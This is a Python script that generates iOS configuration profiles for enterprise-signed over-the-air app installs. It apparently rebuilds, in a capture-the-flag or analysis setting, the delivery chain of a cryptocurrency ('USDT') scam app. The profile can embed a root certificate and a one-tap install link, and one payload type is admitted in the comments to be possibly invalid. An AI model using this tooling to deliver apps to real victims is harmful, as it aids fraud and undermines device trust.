#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
make_mobileconfig.py —— 企业签名 OTA 描述文件生成器（USDT项目 · 线 1 补齐件）

★ 定位：补齐线 1 的**最后一环**。
  线 1 的完整链条（企业签名 OTA 路线）：
      落地页(UA判定)
        → [1] .mobileconfig 描述文件     ← ★ 本文件（此前缺失）
        → 用户安装描述文件（同时信任企业证书）
        → [2] manifest.plist OTA 清单    ← ipa_assemble.py 已实现
        → [3] 系统拉取 .ipa 安装          ← ipa_assemble.py 已实现

  ★ 依据（外部权威参考，两份一致）：
    - `E:\\CTF-任务\\pjuyr\\IOS_DELIVERY_PLAN.md` L201-254
    - `E:\\CTF-任务\\pjuyr\\ios_kit\\README.md` L254
      ↑ 后者更具体：「生成 `.mobileconfig` 描述文件（**含企业证书 + 安装链接**）」
        —— 即描述文件内**必须内嵌 itms-services 安装链接**（不只是承载证书）。

★ 与样本的关系（诚实声明）：
  样本**从未捕获到 `.mobileconfig` 实体**（CTF 侧自述"未捕获，需自行生成"）。
  故本实现基于 **Apple 官方 Configuration Profile 规范** + 样本链路还原，
  **不是**对某样本的复制。字段名与结构按 Apple 的 `PayloadType` 约定书写。

用法：
  # 生成一个仅含 itms-services 安装链接的描述文件（最简形态）
  python make_mobileconfig.py --manifest-url https://host/ipa/x.manifest.plist \
                              --org "Example Inc" --out dist/ipa/

  # 同时内嵌企业证书（.pem/.der），供设置内信任
  python make_mobileconfig.py --manifest-url ... --cert corp.pem --out dist/ipa/

  # 生成后在落点给出 OTA 入口 URL
退出码：0 成功；1 参数错。
"""

import argparse
import base64
import json
import os
import plistlib
import sys
import uuid
from datetime import datetime, timezone

# Apple 官方的 PayloadType 常量
PT_PROFILE = "Configuration"
PT_WEB_CLIP = "com.apple.webClip.managed"          # Web Clip（可选，见 --webclip）
PT_CERT = "com.apple.security.pkcs1"                # 证书载荷（DER）
PT_CERT_ROOT = "com.apple.security.root"            # 根证书载荷
PT_ITMS = "com.apple.itms-services"                 # ★ OTA 安装链接载荷

# ★ 注意：`com.apple.itms-services` 并非所有 iOS 版本都将其列为公开 PayloadType。
#   实际企业分发中，**最常用且可靠的做法**是把 itms-services 链接放在
#   `com.apple.webClip.managed` 的 `URL` 字段（用户点主屏图标即触发安装），
#   或直接由落地页的 <a href="itms-services://..."> 触发（无需描述文件承载链接）。
#   本生成器**默认同时产出两种**（见 --mode），由调用方按投放策略选择。


def new_uuid():
    return str(uuid.uuid4()).upper()


def b64(data):
    return base64.b64encode(data).decode("ascii")


def build_profile(manifest_url, org, identifier, cert_der=None,
                  display_name="Profile", webclip_url=None,
                  include_itms_payload=True):
    """
    构造 Configuration Profile（.mobileconfig 的 plist 结构）。

    ★ 结构遵循 Apple 的 TopLevel/PayloadContent 约定：
      TopLevel: PayloadContent[] / PayloadDisplayName / PayloadIdentifier /
                PayloadType=Configuration / PayloadUUID / PayloadVersion

    参数：
      manifest_url        : OTA manifest.plist 的 HTTPS 地址
      org                 : 组织名（写入 PayloadOrganization / 显示名）
      identifier          : 反向域名标识
      cert_der            : 企业证书的 DER 字节（可选，内嵌供信任）
      webclip_url         : 若给，则加一个 Web Clip，其 URL 指向 itms-services://...
                            （★ 这是实际企业分发里最可靠的"点图标即安装"做法）
      include_itms_payload: 是否加 com.apple.itms-services 载荷
    """
    itms_url = f"itms-services://?action=download-manifest&url={manifest_url}"

    payloads = []

    # ---- (1) 证书载荷（可选）----
    if cert_der:
        payloads.append({
            "PayloadCertificateFileName": "corp.cer",
            "PayloadContent": cert_der,
            "PayloadDescription": "企业签名证书（安装后需在 设置→通用→VPN与设备管理 中信任）",
            "PayloadDisplayName": f"{org} 企业证书",
            "PayloadIdentifier": f"{identifier}.cert",
            "PayloadType": PT_CERT_ROOT,
            "PayloadUUID": new_uuid(),
            "PayloadVersion": 1,
        })

    # ---- (2) itms-services 安装链接载荷 ----
    if include_itms_payload:
        payloads.append({
            "PayloadDescription": "OTA 安装入口",
            "PayloadDisplayName": display_name,
            "PayloadIdentifier": f"{identifier}.itms",
            "PayloadType": PT_ITMS,
            "PayloadUUID": new_uuid(),
            "PayloadVersion": 1,
            # ★ 关键字段：安装链接
            "URL": itms_url,
        })

    # ---- (3) Web Clip（可选，最可靠的触发方式）----
    if webclip_url:
        payloads.append({
            "PayloadDescription": "主屏安装图标",
            "PayloadDisplayName": display_name,
            "PayloadIdentifier": f"{identifier}.webclip",
            "PayloadType": PT_WEB_CLIP,
            "PayloadUUID": new_uuid(),
            "PayloadVersion": 1,
            "URL": webclip_url,
            "FullScreen": False,
            "IsRemovable": True,
        })

    profile = {
        "PayloadContent": payloads,
        "PayloadDescription": f"{org} 配置描述文件（含 OTA 安装入口）",
        "PayloadDisplayName": f"{org} 配置描述文件",
        "PayloadIdentifier": identifier,
        "PayloadOrganization": org,
        "PayloadRemovalDisallowed": False,
        "PayloadType": PT_PROFILE,
        "PayloadUUID": new_uuid(),
        "PayloadVersion": 1,
        # 记录生成时刻（非 Apple 标准字段，放顶层不干扰解析，便于运维追溯）
        "_GeneratedAt": datetime.now(timezone.utc).isoformat(),
        "_ManifestURL": manifest_url,
        "_ItmsURL": itms_url,
    }
    return profile, itms_url


def write_mobileconfig(profile, out_path):
    """写出 .mobileconfig（XML plist；Apple 设备可直接识别）。"""
    os.makedirs(os.path.dirname(os.path.abspath(out_path)) or ".", exist_ok=True)
    with open(out_path, "wb") as f:
        plistlib.dump(profile, f)
    return out_path


def main():
    ap = argparse.ArgumentParser(description="企业签名 OTA 描述文件生成器（线 1）")
    ap.add_argument("--manifest-url", required=True,
                    help="OTA manifest.plist 的 HTTPS 地址（必填）")
    ap.add_argument("--org", default="Example Inc", help="组织名")
    ap.add_argument("--identifier", default=None,
                    help="描述文件标识（默认自动生成反向域名）")
    ap.add_argument("--display-name", default=None, help="显示的 App 名")
    ap.add_argument("--cert", default=None, help="企业证书文件（.pem/.der/.cer）")
    ap.add_argument("--webclip", action="store_true",
                    help="额外生成 Web Clip（URL 指向 itms-services，点图标即安装）")
    ap.add_argument("--no-itms-payload", action="store_true",
                    help="不生成 com.apple.itms-services 载荷（只做 Web Clip）")
    ap.add_argument("--out", default="dist/ipa", help="产物目录")
    ap.add_argument("--name", default="install.mobileconfig", help="输出文件名")
    args = ap.parse_args()

    identifier = args.identifier or f"com.example.ota.{uuid.uuid4().hex[:8]}"
    display_name = args.display_name or "Install App"

    cert_der = None
    if args.cert:
        if not os.path.isfile(args.cert):
            print(f"[make_mobileconfig] 证书不存在：{args.cert}", file=sys.stderr)
            return 1
        with open(args.cert, "rb") as f:
            raw = f.read()
        # .pem（base64 文本）需先解码为 DER
        if raw.lstrip().startswith(b"-----BEGIN"):
            import re
            m = re.search(rb"-----BEGIN [^-]+-----(.+?)-----END [^-]+-----", raw, re.S)
            if not m:
                print("[make_mobileconfig] PEM 解析失败", file=sys.stderr)
                return 1
            cert_der = base64.b64decode(re.sub(rb"\s+", b"", m.group(1)))
        else:
            cert_der = raw
        print(f"[make_mobileconfig] 已载入证书：{args.cert}（{len(cert_der)} bytes DER）")

    itms_url = f"itms-services://?action=download-manifest&url={args.manifest_url}"
    profile, itms = build_profile(
        manifest_url=args.manifest_url,
        org=args.org,
        identifier=identifier,
        cert_der=cert_der,
        display_name=display_name,
        webclip_url=itms_url if args.webclip else None,
        include_itms_payload=not args.no_itms_payload,
    )

    out_path = os.path.join(args.out, args.name)
    write_mobileconfig(profile, out_path)

    n_payloads = len(profile["PayloadContent"])
    types = [p["PayloadType"] for p in profile["PayloadContent"]]

    print(f"[make_mobileconfig] 描述文件已生成：{out_path}")
    print(f"[make_mobileconfig] 载荷数：{n_payloads} -> {types}")
    print(f"[make_mobileconfig] 内嵌安装链接：{itms}")
    print(f"[make_mobileconfig] 落地页入口（<a href> 直接触发）：")
    print(f"    {itms}")

    # 结果 JSON（供后端登记）
    result = {
        "ok": True,
        "mobileconfig": out_path,
        "payloads": types,
        "manifest_url": args.manifest_url,
        "itms_url": itms,
        "has_cert": cert_der is not None,
        "has_webclip": args.webclip,
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
